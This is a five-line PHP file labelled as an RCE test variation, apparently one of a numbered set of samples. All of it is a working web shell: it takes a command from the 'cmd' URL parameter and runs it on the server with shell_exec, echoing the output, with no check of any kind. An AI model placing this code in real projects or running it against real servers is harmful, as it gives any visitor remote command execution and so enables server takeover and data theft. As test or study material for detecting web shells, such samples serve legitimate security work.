<?php
// RCE test variation #770
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>